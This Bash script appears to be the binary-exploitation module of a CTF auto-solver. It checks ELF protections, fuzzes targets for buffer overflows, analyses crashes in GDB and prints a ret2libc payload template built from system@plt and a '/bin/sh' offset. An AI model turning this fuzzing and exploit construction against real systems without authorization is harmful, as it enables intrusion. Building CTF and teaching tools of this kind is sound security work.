#!/usr/bin/env bash
# PWN solver for pwnMyCTF
# Implements binary format identification, execution/I/O interaction,
# buffer overflow fuzzing, GDB integration, and simple ROP chain construction

set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]:-$0}")" && pwd)"
LIB_DIR="${SCRIPT_DIR}/../lib"

source "${LIB_DIR}/flag_extractor.sh" 2>/dev/null || true
source "${LIB_DIR}/check_tools.sh" 2>/dev/null || true
source "${LIB_DIR}/timeout.sh" 2>/dev/null || true

# Flag patterns from flag_extractor.sh
FLAG_PATTERN='flag\{[^}]+\}'
FLAG_PATTERN_ALT='FLAG\{[^}]+\}'
FLAG_PATTERN_CTF='CTF\{[^}]+\}'

# Logging helper (for verbose mode)
log_verbose() {
    local level="$1"
    shift
    if [[ "${VERBOSE:-0}" -ge "$level" ]]; then
        echo "[VERBOSE] $*" >&2
    fi
}

# Helper: search for flag patterns in any input
search_flag_patterns() {
    local content="$1"
    local flag=""

    if flag=$(echo "$content" | grep -Eo "$FLAG_PATTERN" | head -1); then
        echo "$flag"
        return 0
    fi
    if flag=$(echo "$content" | grep -Eo "$FLAG_PATTERN_ALT" | head -1); then
        echo "$flag"
        return 0
    fi
    if flag=$(echo "$content" | grep -Eo "$FLAG_PATTERN_CTF" | head -1); then
        echo "$flag"
        return 0
    fi
    return 1
}

# Helper: search for flag in a file
search_flag_in_file() {
    local file="$1"
    local flag=""

    if [[ ! -f "$file" ]] || [[ ! -r "$file" ]]; then
        return 1
    fi

    if flag=$(grep -Eo "$FLAG_PATTERN" "$file" 2>/dev/null | head -1); then
        echo "$flag"
        return 0
    fi
    if flag=$(grep -Eo "$FLAG_PATTERN_ALT" "$file" 2>/dev/null | head -1); then
        echo "$flag"
        return 0
    fi
    if flag=$(grep -Eo "$FLAG_PATTERN_CTF" "$file" 2>/dev/null | head -1); then
        echo "$flag"
        return 0
    fi
    return 1
}

# ---------------------------------------------------------------------------
# PWN-01: Binary format identification (ELF, PE, Mach-O) + protections
# ---------------------------------------------------------------------------
pwn_identify() {
    local target="$1"
    local verbose="${2:-0}"

    log_verbose 2 "PWN-01: Identifying binary format for: $target"

    if [[ ! -f "$target" ]]; then
        log_verbose 2 "Error: File not found: $target"
        return 1
    fi

    local file_output
    file_output=$(file -b "$target" 2>/dev/null)
    log_verbose 2 "File command output: $file_output"

    local format=""
    if echo "$file_output" | grep -qi "ELF"; then
        format="ELF"
        log_verbose 2 "Detected: ELF binary"

        echo "ELF Binary"

        # Get ELF header info with readelf
        if command -v readelf &>/dev/null; then
            local elf_header
            elf_header=$(readelf -h "$target" 2>/dev/null || true)
            local entry_point
            entry_point=$(echo "$elf_header" | grep "Entry point" | awk '{print $3}' || true)
            local machine
            machine=$(echo "$elf_header" | grep "Machine:" | cut -d: -f2- | xargs || true)
            local elf_class
            elf_class=$(echo "$elf_header" | grep "Class:" | cut -d: -f2- | xargs || true)

            if [[ -n "$entry_point" ]]; then
                echo "  Entry point: $entry_point"
            fi
            if [[ -n "$machine" ]]; then
                echo "  Arch: $machine"
            fi
            if [[ -n "$elf_class" ]]; then
                echo "  Class: $elf_class"
            fi
        fi

        # Check protections via readelf
        local nx="unknown" pie="unknown" relro="unknown" canary="unknown"

        # NX: check GNU_STACK segment — if RWE, NX is disabled
        if command -v readelf &>/dev/null; then
            local stack_flags
            stack_flags=$(readelf -l "$target" 2>/dev/null | grep "GNU_STACK" | awk '{for(i=1;i<=NF;i++) if($i ~ /^R/ || $i ~ /^E/ || $i ~ /^W/) print $i}' || true)
            if echo "$stack_flags" | grep -q "E"; then
                nx="disabled"
            else
                nx="enabled"
            fi

            # RELRO: check for GNU_RELRO segment and BIND_NOW
            if readelf -l "$target" 2>/dev/null | grep -q "GNU_RELRO"; then
                if readelf -d "$target" 2>/dev/null | grep -q "BIND_NOW\|FLAGS.*NOW"; then
                    relro="full"
                else
                    relro="partial"
                fi
            else
                relro="disabled"
            fi

            # PIE: check DYN type in ELF header or FLAGS_1
            local elf_type
            elf_type=$(readelf -h "$target" 2>/dev/null | grep "Type:" | awk '{print $2}' || true)
            if [[ "$elf_type" == "DYN" ]]; then
                pie="enabled"
            else
                pie="disabled"
            fi

            # Canary: check for __stack_chk_fail symbol
            if readelf -s "$target" 2>/dev/null | grep -q "__stack_chk_fail"; then
                canary="enabled"
            else
                canary="disabled"
            fi
        fi

        echo "  Protections: NX=$nx, PIE=$pie, RELRO=$relro, Canary=$canary"

    elif echo "$file_output" | grep -qi "PE"; then
        format="PE"
        log_verbose 2 "Detected: PE (Windows) binary"
        echo "PE (Windows) Binary"
        echo "  Note: Limited analysis support for PE binaries"

    elif echo "$file_output" | grep -qi "Mach-O"; then
        format="Mach-O"
        log_verbose 2 "Detected: Mach-O (macOS) binary"
        echo "Mach-O (macOS) Binary"
        echo "  Note: Limited analysis support for Mach-O binaries"

    else
        log_verbose 2 "Unknown binary format"
        echo "Unknown binary format: $file_output"
        return 1
    fi

    return 0
}

# ---------------------------------------------------------------------------
# PWN-02: Binary execution and I/O interaction
# ---------------------------------------------------------------------------
pwn_execute() {
    local target="$1"
    local input="${2:-}"
    local timeout_sec="${3:-$DEFAULT_TIMEOUT_PWN}"
    local verbose="${4:-0}"

    log_verbose 2 "PWN-02: Executing target: $target (timeout: ${timeout_sec}s)"

    local stdout_output=""
    local stderr_output=""
    local exit_code=0

    # Detect if target is a network endpoint (host:port format)
    if [[ "$target" =~ ^[a-zA-Z0-9._-]+:[0-9]+$ ]]; then
        # Network target: use netcat
        local host port
        IFS=: read -r host port <<< "$target"
        log_verbose 2 "Network target: $host:$port"

        if ! command -v nc &>/dev/null; then
            log_verbose 2 "Error: netcat (nc) not available for network interaction"
            return 2
        fi

        local nc_output
        nc_output=$(printf '%b' "$input" | nc -w "${timeout_sec}" "$host" "$port" 2>&1)
        exit_code=$?
        stdout_output="$nc_output"

    elif [[ -f "$target" ]]; then
        # Local file: execute with timeout wrapper
        if [[ ! -x "$target" ]]; then
            log_verbose 2 "Binary not executable, attempting chmod +x"
            chmod +x "$target" 2>/dev/null || true
        fi

        local output
        if [[ -n "$input" ]]; then
            output=$(printf '%b' "$input" | run_with_timeout "$timeout_sec" "$target" 2>&1)
        else
            output=$(run_with_timeout "$timeout_sec" "$target" < /dev/null 2>&1)
        fi
        exit_code=$?
        stdout_output="$output"
    else
        log_verbose 2 "Error: Target not found: $target"
        return 1
    fi

    # Print captured stdout
    if [[ -n "$stdout_output" ]]; then
        echo "$stdout_output"
    fi

    # Interpret exit code for verbose mode
    if [[ "$verbose" -ge 2 ]]; then
        case "$exit_code" in
            0)   log_verbose 2 "Exit code: 0 (normal)" ;;
            124) log_verbose 2 "Exit code: 124 (timeout)" ;;
            139) log_verbose 2 "Exit code: 139 (SIGSEGV - segmentation fault)" ;;
            134) log_verbose 2 "Exit code: 134 (SIGABRT - abort)" ;;
            136) log_verbose 2 "Exit code: 136 (SIGFPE - floating point exception)" ;;
            132) log_verbose 2 "Exit code: 132 (SIGILL - illegal instruction)" ;;
            *)   log_verbose 2 "Exit code: $exit_code" ;;
        esac
    fi

    return "$exit_code"
}

# ---------------------------------------------------------------------------
# PWN-03: Buffer overflow detection via fuzzing
# ---------------------------------------------------------------------------
pwn_fuzz() {
    local target="$1"
    local verbose="${2:-0}"

    log_verbose 1 "PWN-03: Starting fuzzing for: $target"

    # Payload sizes to test
    local sizes=(64 128 256 512 1024 2048 4096 8192)
    local crash_size=0
    local crash_code=0
    local crash_payload=""

    echo "Fuzzing results:"

    for size in "${sizes[@]}"; do
        # Generate payload: repeated 'A' pattern
        local payload
        payload=$(head -c "$size" /dev/zero | tr '\0' 'A')

        # Execute with 5-second timeout
        local output
        output=$(pwn_execute "$target" "$payload" 5 "$verbose" 2>&1)
        local ec=$?

        if [[ $ec -eq 139 || $ec -eq 134 || $ec -eq 136 || $ec -eq 132 ]]; then
            echo "  Size $size: CRASH (exit $ec)"
            if [[ $crash_size -eq 0 ]]; then
                crash_size=$size
                crash_code=$ec
                crash_payload="$payload"
            fi
        else
            echo "  Size $size: OK (exit $ec)"
        fi
    done

    # Report results
    if [[ $crash_size -gt 0 ]]; then
        echo ""
        echo "Crash detected at $crash_size bytes — potential buffer overflow"
        echo "  Exit code: $crash_code"
        # Store crash info for downstream use
        export PWN_CRASH_SIZE="$crash_size"
        export PWN_CRASH_CODE="$crash_code"
        return 0
    else
        echo ""
        echo "No crash detected up to 8192 bytes"
        return 1
    fi
}

# ---------------------------------------------------------------------------
# PWN-04: GDB integration (batch mode) for crash analysis
# ---------------------------------------------------------------------------
pwn_gdb_analyze() {
    local target="$1"
    local verbose="${2:-0}"

    log_verbose 1 "PWN-04: Starting GDB analysis for: $target"

    # Check if gdb is available
    if ! command -v gdb &>/dev/null; then
        log_verbose 1 "GDB not available — skipping GDB analysis"
        echo "GDB not available"
        return 2
    fi

    local gdb_output=""

    # Phase 1: Static analysis — info functions, info files, checksec
    log_verbose 2 "GDB Phase 1: Static analysis"
    gdb_output=$(gdb -batch -nx \
        -ex "set pagination off" \
        -ex "set confirm off" \
        -ex "file $target" \
        -ex "info functions" \
        -ex "info files" \
        -ex "checksec" 2>/dev/null || true)

    # Parse interesting functions
    local interesting_funcs=""
    local func_patterns="main|win|flag|get_flag|system|exec|shell|vuln|overflow|pwn|hack|secret|backdoor"
    interesting_funcs=$(echo "$gdb_output" | grep -oE "($func_patterns)[a-zA-Z0-9_]*" | sort -u | tr '\n' ', ' | sed 's/,$//' || true)

    if [[ -n "$interesting_funcs" ]]; then
        echo "GDB Analysis:"
        echo "  Interesting functions: $interesting_funcs"
    fi

    # Parse protections from checksec output
    local protections=""
    if echo "$gdb_output" | grep -qi "checksec"; then
        protections=$(echo "$gdb_output" | grep -A5 "checksec" | tail -n +2 || true)
    fi

    # Phase 2: Run binary normally to check for immediate crashes
    log_verbose 2 "GDB Phase 2: Normal execution"
    local run_output
    run_output=$(gdb -batch -nx \
        -ex "set pagination off" \
        -ex "set confirm off" \
        -ex "file $target" \
        -ex "run < /dev/null" \
        -ex "info registers" \
        -ex "bt" 2>/dev/null || true)

    # Check for segfault in normal run
    if echo "$run_output" | grep -qi "SIGSEGV\|SIGABRT\|Program received signal"; then
        echo "  Crash on normal execution detected"

        # Extract register values at crash
        local rip_reg
        rip_reg=$(echo "$run_output" | grep -E "rip|RIP|eip|EIP" | head -1 || true)
        if [[ -n "$rip_reg" ]]; then
            echo "  Crash register: $rip_reg"
        fi

        # Extract backtrace
        local bt
        bt=$(echo "$run_output" | grep -A10 "^#" | head -10 || true)
        if [[ -n "$bt" ]]; then
            echo "  Backtrace:"
            echo "$bt" | while read -r line; do
                echo "    $line"
            done
        fi
    fi

    # Phase 3: If we have a known crash size from fuzzing, analyze with payload
    if [[ -n "${PWN_CRASH_SIZE:-}" ]] && [[ "$PWN_CRASH_SIZE" -gt 0 ]]; then
        log_verbose 2 "GDB Phase 3: Crash payload analysis (size: $PWN_CRASH_SIZE)"

        local crash_payload
        crash_payload=$(head -c "${PWN_CRASH_SIZE}" /dev/zero | tr '\0' 'A')

        # Write payload to temp file (safer than heredoc for large payloads)
        local tmpfile
        tmpfile=$(mktemp /tmp/pwn_gdb_payload.XXXXXX 2>/dev/null || echo "")
        if [[ -n "$tmpfile" ]]; then
            printf '%s' "$crash_payload" > "$tmpfile"

            local crash_gdb_output
            crash_gdb_output=$(gdb -batch -nx \
                -ex "set pagination off" \
                -ex "set confirm off" \
                -ex "file $target" \
                -ex "run < $tmpfile" \
                -ex "info registers" \
                -ex "x/20x \$rsp" \
                -ex "bt" \
                2>/dev/null || true)

            rm -f "$tmpfile"

            # Extract instruction pointer at crash
            local rip_val
            rip_val=$(echo "$crash_gdb_output" | grep -E "rip|RIP|eip|EIP" | head -1 || true)
            if [[ -n "$rip_val" ]]; then
                echo "  Crash point: $rip_val"
            fi

            # Extract stack contents at crash
            local stack_dump
            stack_dump=$(echo "$crash_gdb_output" | grep -A3 "x/20x" | tail -n +2 | head -5 || true)
            if [[ -n "$stack_dump" ]]; then
                echo "  Stack at crash:"
                echo "$stack_dump" | while read -r line; do
                    echo "    $line"
                done
            fi
        fi
    fi

    # If no interesting output was produced, show basic info
    if [[ -z "$interesting_funcs" ]]; then
        echo "GDB Analysis:"
        echo "  No interesting functions detected"
    fi

    return 0
}

# ---------------------------------------------------------------------------
# PWN-05: Simple ROP chain (ret2libc with system@plt + /bin/sh)
# ---------------------------------------------------------------------------
pwn_rop_chain() {
    local target="$1"
    local verbose="${2:-0}"

    log_verbose 1 "PWN-05: Starting ROP chain analysis for: $target"

    echo "ROP Chain Analysis:"

    # Step 1: Identify target libc
    local libc_path=""
    if command -v ldd &>/dev/null; then
        libc_path=$(ldd "$target" 2>/dev/null | grep "libc.so" | awk '{print $3}' | head -1 || true)
    fi
    if [[ -z "$libc_path" ]] && command -v readelf &>/dev/null; then
        libc_path=$(readelf -d "$target" 2>/dev/null | grep "NEEDED" | grep "libc" | awk -F'[][]' '{print $2}' | head -1 || true)
        if [[ -n "$libc_path" ]]; then
            # Resolve to full path via ldconfig or common locations
            libc_path=$(ldconfig -p 2>/dev/null | grep "$libc_path" | awk '{print $NF}' | head -1 || true)
        fi
    fi

    if [[ -n "$libc_path" ]]; then
        echo "  libc: $libc_path"
    else
        echo "  libc: not found (static binary or ldd unavailable)"
    fi

    # Step 2: Find useful function addresses in the binary
    local system_plt="" execve_plt="" puts_plt="" gets_plt="" read_plt=""

    if command -v objdump &>/dev/null; then
        local plt_entries
        plt_entries=$(objdump -R "$target" 2>/dev/null || true)

        system_plt=$(echo "$plt_entries" | grep -i "system" | awk '{print $1}' | head -1 || true)
        execve_plt=$(echo "$plt_entries" | grep -i "execve" | awk '{print $1}' | head -1 || true)
        puts_plt=$(echo "$plt_entries" | grep -i "puts" | awk '{print $1}' | head -1 || true)
        gets_plt=$(echo "$plt_entries" | grep -i "gets" | awk '{print $1}' | head -1 || true)
        read_plt=$(echo "$plt_entries" | grep -i " read@" | awk '{print $1}' | head -1 || true)
    fi

    # Also check nm for PLT entries
    if [[ -z "$system_plt" ]] && command -v nm &>/dev/null; then
        system_plt=$(nm -D "$target" 2>/dev/null | grep -i "system" | awk '{print $1}' | head -1 || true)
    fi

    if [[ -n "$system_plt" ]]; then
        echo "  system@plt: 0x$system_plt"
    fi
    if [[ -n "$execve_plt" ]]; then
        echo "  execve@plt: 0x$execve_plt"
    fi
    if [[ -n "$puts_plt" ]]; then
        echo "  puts@plt: 0x$puts_plt"
    fi
    if [[ -n "$gets_plt" ]]; then
        echo "  gets@plt: 0x$gets_plt"
    fi
    if [[ -n "$read_plt" ]]; then
        echo "  read@plt: 0x$read_plt"
    fi

    # Step 3: Find "/bin/sh" string in libc or binary
    local binsh_offset=""
    if [[ -n "$libc_path" ]] && [[ -f "$libc_path" ]]; then
        binsh_offset=$(strings -t x "$libc_path" 2>/dev/null | grep "/bin/sh" | awk '{print $1}' | head -1 || true)
    fi
    # Also check the binary itself
    if [[ -z "$binsh_offset" ]]; then
        binsh_offset=$(strings -t x "$target" 2>/dev/null | grep "/bin/sh" | awk '{print $1}' | head -1 || true)
    fi

    if [[ -n "$binsh_offset" ]]; then
        echo "  /bin/sh offset: 0x$binsh_offset"
    else
        echo "  /bin/sh: not found in binary or libc"
    fi

    # Step 4: Construct simple ret2libc payload if possible
    local padding="${PWN_CRASH_SIZE:-0}"

    if [[ -n "$system_plt" ]] && [[ -n "$binsh_offset" ]] && [[ "$padding" -gt 0 ]]; then
        echo ""
        echo "  Suggested payload (padding=$padding):"

        # Build the payload as a printf command
        # Format: [padding bytes][system_addr][ret_addr][binsh_addr]
        # Note: This is a simplified ret2libc — actual addresses need libc base resolution
        local padding_bytes
        padding_bytes=$(printf 'A%.0s' $(seq 1 "$padding"))

        echo "  [${padding} bytes padding][0x${system_plt}][ret_addr][0x<libc_base>+0x${binsh_offset}]"
        echo ""
        echo "  Command template:"
        echo "  printf '${padding_bytes}<hex_payload>' | ./target"
        echo ""
        echo "  Note: libc base address must be determined (ASLR bypass or leak required)"
        return 0
    elif [[ -n "$system_plt" ]] && [[ -n "$binsh_offset" ]]; then
        echo ""
        echo "  Found system@plt and /bin/sh, but no crash offset from fuzzing"
        echo "  Run pwn_fuzz() first to determine padding size"
        return 1
    else
        echo ""
        echo "  Insufficient information for ret2libc chain"
        if [[ -z "$system_plt" ]]; then
            echo "  Missing: system@plt entry"
        fi
        if [[ -z "$binsh_offset" ]]; then
            echo "  Missing: /bin/sh string"
        fi
        return 1
    fi
}

# ---------------------------------------------------------------------------
# Main entry point: solve_pwn
# ---------------------------------------------------------------------------
solve_pwn() {
    local target="$1"
    local verbose="${2:-0}"

    # Set global VERBOSE for log_verbose function
    export VERBOSE="$verbose"

    log_verbose 1 "Starting PWN solver for: $target"

    local flag=""
    local result=""

    # Validate input
    if [[ ! -f "$target" ]]; then
        log_verbose 1 "Error: Target not found: $target"
        return 2
    fi

    # PWN-01: Binary format identification
    log_verbose 1 "Step 1: Binary format identification"
    local binary_format
    binary_format=$(pwn_identify "$target" "$verbose")
    log_verbose 1 "Identified: $binary_format"

    # Check if it's a recognized binary format
    if [[ -z "$binary_format" ]] || [[ "$binary_format" == "Unknown"* ]]; then
        log_verbose 1 "Not a recognized binary format"
        return 2
    fi

    # PWN-02: Basic execution with empty input
    log_verbose 1 "Step 2: Basic execution test"
    local exec_output
    exec_output=$(pwn_execute "$target" "" "$DEFAULT_TIMEOUT_PWN" "$verbose" 2>&1) || true

    # Search for flag in execution output
    if flag=$(search_flag_patterns "$exec_output"); then
        echo "$flag"
        return 0
    fi

    # PWN-03: Fuzzing if no flag found
    log_verbose 1 "Step 3: Buffer overflow fuzzing"
    local fuzz_output
    fuzz_output=$(pwn_fuzz "$target" "$verbose" 2>&1) || true
    log_verbose 1 "Fuzzing: $fuzz_output"

    # Search for flag in fuzzing output
    if flag=$(search_flag_patterns "$fuzz_output"); then
        echo "$flag"
        return 0
    fi

    # PWN-04: GDB analysis if crash detected
    if [[ -n "${PWN_CRASH_SIZE:-}" ]] && [[ "$PWN_CRASH_SIZE" -gt 0 ]]; then
        log_verbose 1 "Step 4: GDB crash analysis"
        local gdb_output
        gdb_output=$(pwn_gdb_analyze "$target" "$verbose" 2>&1) || true
        log_verbose 1 "GDB: $gdb_output"

        # Search for flag in GDB output
        if flag=$(search_flag_patterns "$gdb_output"); then
            echo "$flag"
            return 0
        fi
    fi

    # PWN-05: ROP chain if crash detected and no flag found
    if [[ -n "${PWN_CRASH_SIZE:-}" ]] && [[ "$PWN_CRASH_SIZE" -gt 0 ]]; then
        log_verbose 1 "Step 5: ROP chain analysis"
        local rop_output
        rop_output=$(pwn_rop_chain "$target" "$verbose" 2>&1) || true
        log_verbose 1 "ROP: $rop_output"

        # Search for flag in ROP output
        if flag=$(search_flag_patterns "$rop_output"); then
            echo "$flag"
            return 0
        fi
    fi

    log_verbose 1 "No flag found in PWN analysis"
    return 2
}

# Export functions for use by lib/solver.sh
export -f solve_pwn
export -f pwn_identify
export -f pwn_execute
export -f pwn_fuzz
export -f pwn_gdb_analyze
export -f pwn_rop_chain
export -f log_verbose
export -f search_flag_patterns
export -f search_flag_in_file
